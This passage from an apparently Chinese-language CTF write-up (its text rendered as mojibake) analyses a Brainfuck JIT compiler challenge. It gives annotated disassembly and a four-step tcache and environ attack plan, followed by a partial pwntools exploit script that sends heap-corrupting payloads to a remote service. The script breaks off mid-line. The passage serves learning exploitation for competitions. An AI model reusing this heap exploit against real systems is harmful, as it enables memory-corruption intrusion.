0x7f5434ba2052; å¦‚æœ offset è¶…è¿‡ now_size, malloce(2*now_size)ï¼Œé—®é¢˜åœ¨äº jg æ˜¯å¸¦ç¬¦å·æ¯”è¾ƒï¼Œoffset å°äº 0 æ—¶ä¸ä¼šè§¦å‘<br>   0x7f5434ba2010:      push   rdi; ä¿å­˜ rdi<br>   0x7f5434ba2011:      mov    rax,QWORD PTR [rdi+0x20]<br>   0x7f5434ba2015:      mov    rdi,QWORD PTR [rdi+0x8]<br>   0x7f5434ba2019:      shl    rdi,1<br>   0x7f5434ba201c:      call   rax; malloc(2*now_size)<br>   0x7f5434ba201e:      mov    rdi,QWORD PTR [rsp]; æ¢å¤ rdi<br>   0x7f5434ba2022:      push   rax<br>   0x7f5434ba2023:      mov    rdx,QWORD PTR [rdi+0x8]<br>   0x7f5434ba2027:      mov    rax,QWORD PTR [rdi+0x30]<br>   0x7f5434ba202b:      mov    rsi,QWORD PTR [rdi]<br>   0x7f5434ba202e:      mov    rdi,QWORD PTR [rsp]<br>   0x7f5434ba2032:      call   rax; memcpy(old_ptr,new_ptr,new_size)<br>   0x7f5434ba2034:      mov    rdi,QWORD PTR [rsp+0x8]<br>   0x7f5434ba2039:      mov    rax,QWORD PTR [rdi+0x28]<br>   0x7f5434ba203d:      mov    rdi,QWORD PTR [rdi]<br>   0x7f5434ba2040:      call   rax; free(old_ptr)<br>   0x7f5434ba2042:      pop    rsi; æ¢å¤å †æ ˆï¼Œä¸‹åŒ<br>   0x7f5434ba2043:      pop    rdi<br>   0x7f5434ba2044:      mov    QWORD PTR [rdi],rsi; *&amp;old_ptr=new_ptr<br>   0x7f5434ba2047:      mov    rax,QWORD PTR [rdi+0x8]<br>   0x7f5434ba204b:      shl    rax,1<br>   0x7f5434ba204e:      mov    QWORD PTR [rdi+0x8],rax; *&amp;old_size = new_size<br>   0x7f5434ba2052:      ret<br>&#x27;&gt;&#x27;:<br>   0x7f5434ba2053:      call   0x7f5434ba2000<br>   0x7f5434ba2058:      add    QWORD PTR [rdi+0x10],0x1<br>   0x7f5434ba205d:      ret<br>&#x27;&lt;&#x27;:<br>   0x7f5434ba205e:      call   0x7f5434ba2000<br>   0x7f5434ba2063:      sub    QWORD PTR [rdi+0x10],0x1<br>   0x7f5434ba2068:      ret<br>&#x27;+&#x27;:<br>   0x7f5434ba2069:      mov    rax,QWORD PTR [rdi]<br>   0x7f5434ba206c:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba2070:      add    BYTE PTR [rax+rbx*1],0x1<br>   0x7f5434ba2074:      ret<br>&#x27;-&#x27;:<br>   0x7f5434ba2075:      mov    rax,QWORD PTR [rdi]<br>   0x7f5434ba2078:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba207c:      sub    BYTE PTR [rax+rbx*1],0x1<br>   0x7f5434ba2080:      ret<br>&#x27;,&#x27;:<br>   0x7f5434ba2081:      push   rdi<br>   0x7f5434ba2082:      mov    rax,QWORD PTR [rdi]<br>   0x7f5434ba2085:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba2089:      add    rax,rbx<br>   0x7f5434ba208c:      mov    rsi,rax<br>   0x7f5434ba208f:      xor    rax,rax<br>   0x7f5434ba2092:      xor    rdi,rdi<br>   0x7f5434ba2095:      xor    rdx,rdx<br>   0x7f5434ba2098:      inc    rdx<br>   0x7f5434ba209b:      syscall; read(0,prt,1);<br>   0x7f5434ba209d:      pop    rdi<br>   0x7f5434ba209e:      ret<br>&#x27;.&#x27;:<br>   0x7f5434ba209f:      push   rdi<br>   0x7f5434ba20a0:      mov    rax,QWORD PTR [rdi]<br>   0x7f5434ba20a3:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba20a7:      add    rax,rbx<br>   0x7f5434ba20aa:      mov    rsi,rax<br>   0x7f5434ba20ad:      xor    rax,rax<br>   0x7f5434ba20b0:      inc    rax<br>   0x7f5434ba20b3:      mov    rdi,rax<br>   0x7f5434ba20b6:      mov    rdx,rax<br>   0x7f5434ba20b9:      syscall; write(1,prt,1);<br>   0x7f5434ba20bb:      pop    rdi<br>   0x7f5434ba20bc:      ret<br>check *ptr for &#x27;[&#x27; and &#x27;]&#x27;:<br>   0x7f5434ba20bd:      mov    rax,QWORD PTR [rdi]<br>   0x7f5434ba20c0:      mov    rbx,QWORD PTR [rdi+0x10]<br>   0x7f5434ba20c4:      mov    cl,BYTE PTR [rax+rbx*1]<br>   0x7f5434ba20c7:      and    cl,cl<br>   0x7f5434ba20c9:      ret<br>&#x27;?&#x27;:<br>   0x7f5434ba20ca:      mov    al,BYTE PTR [rdi+0x38]<br>   0x7f5434ba20cd:      and    al,al; åªæœ‰ä¿©æ¬¡ malloc(0x1) æœºä¼š<br>   0x7f5434ba20cf:      je     0x7f5434ba20e4<br>   0x7f5434ba20d1:      sub    BYTE PTR [rdi+0x38],0x1<br>   0x7f5434ba20d5:      push   rdi<br>   0x7f5434ba20d6:      mov    rax,QWORD PTR [rdi+0x20]<br>   0x7f5434ba20da:      xor    rdi,rdi<br>   0x7f5434ba20dd:      add    rdi,0x1<br>   0x7f5434ba20e1:      call   rax; malloc(0x1)<br>   0x7f5434ba20e3:      pop    rdi<br>   0x7f5434ba20e4:      ret<br>user_input:<br>   0x7f5434ba20e5:      call   0x7f5434ba2081<br>   0x7f5434ba20ea:      call   0x7f5434ba2075<br>   0x7f5434ba20ef:      call   0x7f5434ba2075<br>   0x7f5434ba20f4:      call   0x7f5434ba2075<br>   0x7f5434ba20f9:      call   0x7f5434ba2075<br>   0x7f5434ba20fe:      call   0x7f5434ba2075<br>   0x7f5434ba2103:      call   0x7f5434ba2075<br>   0x7f5434ba2108:      call   0x7f5434ba2075<br>   0x7f5434ba210d:      call   0x7f5434ba2075<br>   0x7f5434ba2112:      call   0x7f5434ba2075<br>   0x7f5434ba2117:      call   0x7f5434ba2075<br>   0x7f5434ba211c:      call   0x7f5434ba20bd<br>   0x7f5434ba2121:      je     0x7f5434ba219a<br>   0x7f5434ba2127:      call   0x7f5434ba2069<br>   ...<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘åªçœ‹åˆ° <code>&lt;</code> å¯ä»¥è¶Šç•Œï¼Œä½†æ²¡æœ‰è€ƒè™‘ <code>malloc</code> çš„é—®é¢˜ï¼Œå¯¼è‡´æœ€åæ”¹å®Œäº†æ²¡ <code>malloc</code> å¯„äº†ã€‚ä¸‹æ¬¡ä¸€å®šæ³¨æ„ã€‚</p><p>é‚£ä¹ˆå°±å¾ˆç®€å•äº†ï¼ˆæŠ›å¼€è¿œç¨‹å’Œæˆ‘æœ¬åœ°å·®äº† 0x520 çš„ <code>chunk</code> çš„æœªçŸ¥é—®é¢˜ orzï¼‰ï¼ŒæŠŠé˜Ÿä¼ wp æŠ„è¿™é‡Œå°±è¡Œäº†ï¼š</p><ol><li>ä¿®æ”¹tcache_structï¼Œåˆ†é…å‡ºtcache_struct</li><li>ä¿®æ”¹tcache_structï¼Œéšæ„åˆ†é…ï¼Œä½¿tcache_structè¢«freeå¹¶è¿›â¼Šunsorted bin</li><li>æ³„æ¼libcåœ°å€ï¼Œä¿®æ”¹tcache_structï¼Œåˆ†é…â¾„environï¼Œæ­¤æ—¶æ ˆåœ°å€åº”è¯¥è¢«æ”¾â¼Šäº†å †ä¸­ï¼Œæ³„æ¼æ ˆåœ°å€</li><li>ä¿®æ”¹tcache_structï¼Œåˆ†é…åˆ°æ ˆä¸Šï¼Œå†™rop</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./bfc&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./bfc&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;119.13.89.159&quot;</span>,<span class="hljs-number">3301</span>)<br><span class="hljs-comment"># debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">è¾“å…¥ä»»æ„å­—èŠ‚ï¼ˆ&gt; == å³ï¼‰ ---------- ä»£è¡¨ (10) æˆªæ–­</span><br><span class="hljs-string">,----------[++++++++++.&lt;----------]</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>             <span class="hljs-comment"># æ¢è¡Œæˆªæ–­                        å·¦ç§»åˆ°&#x27;\x00&#x27;           </span><br><span class="hljs-comment"># Stage 1 Leak Heap</span><br>code = <span class="hljs-string">&#x27;,----------[++++++++++&lt;,----------]&#x27;</span> + <span class="hljs-string">&quot;&lt;&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">&quot;.&gt;&quot;</span>*<span class="hljs-number">8</span><br><span class="hljs-comment"># Stage 2 Leak Libc</span><br><span class="hljs-comment"># Make Fake Tcache</span><br>code += <span class="hljs-string">&#x27;&lt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&lt;,----------]&#x27;</span><br><span class="hljs-comment"># Free Big Chunk</span><br>code += <span class="hljs-string">&#x27;&gt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&gt;,----------]&#x27;</span><br><span class="hljs-comment"># Get Leak</span><br>code += <span class="hljs-string">&#x27;&lt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&lt;,----------]&#x27;</span> + <span class="hljs-string">&quot;&lt;&quot;</span>*<span class="hljs-number">0x7</span> + <span class="hljs-string">&quot;.&gt;&quot;</span>*<span class="hljs-number">0x8</span><br><span class="hljs-comment"># Stage 3 Leak Stack</span><br><span class="hljs-comment"># Make Environ</span><br>code += <span class="hljs-string">&#x27;&lt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&lt;,----------]&#x27;</span> + <span class="hljs-string">&#x27;?&#x27;</span><br><span class="hljs-comment"># Get Leak</span><br>code += <span class="hljs-string">&#x27;&gt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&gt;,----------]&#x27;</span> + <span class="hljs-string">&quot;.&gt;&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">&#x27;&gt;&#x27;</span><br><span class="hljs-comment"># Stage 4 ROP</span><br>code += <span class="hljs-string">&#x27;&lt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&lt;,----------]&#x27;</span><br>code += <span class="hljs-string">&#x27;&gt;&#x27;</span> + <span class="hljs-string">&#x27;,----------[++++++++++&gt;,----------]&#x27;</span><br><br>code = code.ljust(<span class="hljs-number">0x1000</span>,<span class="hljs-string">&#x27;,&#x27;</span>)<br>sla(<span class="hljs-string">&quot;size of code:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)))<br>sea(<span class="hljs-string">&quot;code:&quot;</span>,code)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x55555555d000      0x0                 0x290                Used                None              None</span><br><span class="hljs-string">0x55555555d290      0x0                 0x11c10              Used                None              None</span><br><span class="hljs-string">0x55555556eea0      0x0                 0x60                 Used                None              None</span><br><span class="hljs-string">0x55555556ef00      0xc30847            0x30                 Used                None              None</span><br><span class="hljs-string">0x55555556ef30      0x0                 0x30                 Used                None              None</span><br><span class="hljs-string">0x55555556ef60      0x0                 0x30                 Used                None              None</span><br><span class="hljs-string">0x55555556ef90      0x0                 0x50                 Used                None              None</span><br><span class="hljs-string">0x55555556efe0      0x0                 0x210                Used                None              None</span><br><span class="hljs-string">0x55555556f1f0      0x0                 0x410                Used                None              None</span><br><span class="hljs-string">0x55555556f600      0x0                 0x1010               Used                None              None</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] LOCAL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>CHUNKS =  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1000</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] REMOTE</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>CHUNKS = <span class="hljs-string">&#x27;&#x27;</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb00</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 1: Leak Heap</span><br><span class="hljs-string">0x11c11 0x11c00</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>CHUNKS = <span class="hljs-string">&#x27;&#x27;</span><br>CHUNKS += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb00</span><br><br>sl(CHUNKS[::-<span class="hljs-number">1</span>])<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\x00\x00&#x27;</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x11ff0</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><span class="hljs-comment"># assert &#x27;\x21&#x27; not in data0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Stage 2: Leak Libc</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># Fake Tcache</span><br>FAKE_TCACHE = p16(<span class="hljs-number">1</span>)+p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3f</span> + p64(heap_base+<span class="hljs-number">0x300</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3f</span><br>CHUNKS =  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br><br>CHUNKS = FAKE_TCACHE + CHUNKS<br>sl(CHUNKS[::-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># Make free</span><br>FAKE_TCACHE = p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3d</span> + p16(<span class="hljs-number">0xff</span>) + p64(<span class="hljs-number">0</span>) + p64(heap_base+<span class="hljs-number">0x121f0</span>+<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x3e</span><br>CHUNKS =  p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x11c11</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x11c00</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x51</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x411</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb00</span><br>CHUNKS += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br><br><br>CHUNKS = FAKE_TCACHE + CHUNKS<br>sl(CHUNKS)<br><span class="hljs-comment"># Get Leak</span><br>CHUNKS = <span class="hljs-string">&#x27;&#x27;</span><br>CHUNKS += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x410</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1011</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xb00</span><br>CHUNKS += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span><br>CHUNKS += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>sl(CHUNKS[::-<span class="hljs-number">1</span>])<br>libc_leak = 